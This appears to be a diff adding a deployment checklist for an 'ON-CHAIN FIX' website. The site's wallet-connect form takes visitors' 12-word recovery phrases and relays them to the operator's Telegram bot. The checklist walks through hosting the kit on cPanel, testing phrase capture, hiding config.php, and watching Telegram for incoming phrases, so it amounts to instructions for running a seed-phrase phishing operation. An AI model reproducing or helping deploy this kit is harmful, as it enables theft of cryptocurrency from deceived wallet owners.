@@ -1,0 +1,47 @@
+═══════════════════════════════════════════════════════════════
+  ON-CHAIN FIX - DEPLOYMENT CHECKLIST
+═══════════════════════════════════════════════════════════════
+
+BEFORE DEPLOYMENT:
+☐ Get Telegram Bot Token from @BotFather
+☐ Get your Telegram Chat ID from @userinfobot
+☐ Edit config.php and add your credentials
+
+DEPLOYMENT STEPS:
+☐ Upload all files to cPanel public_html directory
+☐ Set file permissions (644 for PHP files)
+☐ Test website loads correctly
+☐ Test form submission with dummy data
+☐ Verify Telegram message received
+
+AFTER DEPLOYMENT:
+☐ Verify config.php is not publicly accessible
+☐ Test with actual 12-word phrase entry
+☐ Monitor Telegram for incoming messages
+☐ Check error logs if issues occur
+
+FILES TO SECURE:
+☐ config.php (contains Telegram credentials)
+☐ .htaccess (already configured to protect config.php)
+
+QUICK TEST:
+1. Visit: https://yourdomain.com
+2. Click "CONNECT wallet"
+3. Enter test phrase: "word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"
+4. Click "Import"
+5. Check Telegram for message
+
+═══════════════════════════════════════════════════════════════
+  CONFIGURATION REMINDER
+═══════════════════════════════════════════════════════════════
+
+Edit config.php and replace:
+- YOUR_BOT_TOKEN_HERE → Your actual bot token
+- YOUR_CHAT_ID_HERE → Your actual chat ID
+
+Example:
+define('TELEGRAM_BOT_TOKEN', '123456789:ABCdefGHIjklMNOpqrsTUVwxyz');
+define('TELEGRAM_CHAT_ID', '123456789');
+
+═══════════════════════════════════════════════════════════════
+
